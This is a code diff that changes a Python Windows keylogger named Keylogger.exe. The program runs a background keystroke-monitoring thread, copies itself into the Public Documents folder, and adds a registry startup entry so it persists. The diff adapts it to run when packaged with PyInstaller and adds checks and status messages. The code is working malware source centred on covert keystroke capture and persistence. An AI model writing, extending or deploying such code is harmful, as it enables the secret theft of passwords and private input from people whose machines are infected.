@@ -8,6 +8,7 @@ import win32process
 import win32api
 import threading
 import atexit
+import sys
 import shutil
 import winreg as reg
 from datetime import datetime
@@ -170,19 +171,22 @@ def keystroke_monitor():
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
 keystroke_thread.start()
 
-import os
-import shutil
-import winreg as reg
-
 # Define paths
-original_path = os.path.abspath(__file__)  # Path to the current executable
-alternative_path = r"C:\Users\Public\Documents\Keylogger.exe"  # Alternative path for copying
+if getattr(sys, 'frozen', False):
+    original_path = os.path.join(sys._MEIPASS, 'Keylogger.exe')  # Path to the current executable when frozen
+else:
+    original_path = os.path.abspath(__file__)  # Path to the current script
+
+alternative_path = r"C:\Users\Public\Documents\Keylogger.exe"  # Path for copying
 
 # Function to copy the executable to an alternative location
 def copy_executable_to_alternative():
     try:
-        shutil.copy(original_path, alternative_path)
-        print("Executable copied to Public Documents folder.")
+        if not os.path.exists(alternative_path):
+            shutil.copy(original_path, alternative_path)
+            print("Executable copied to Public Documents folder.")
+        else:
+            print("Executable already exists in Public Documents folder.")
     except Exception as e:
         print(f"Failed to copy executable to Public Documents folder: {e}")
 
@@ -195,6 +199,7 @@ def add_to_startup():
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
             reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, command)  # Store the command in the registry
+        print("Successfully added to startup.")
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
@@ -203,6 +208,7 @@ copy_executable_to_alternative()
 
 # Add to startup
 add_to_startup()
+
 # Function to check idle time
 def get_idle_duration():
     last_input_info = win32api.GetLastInputInfo()
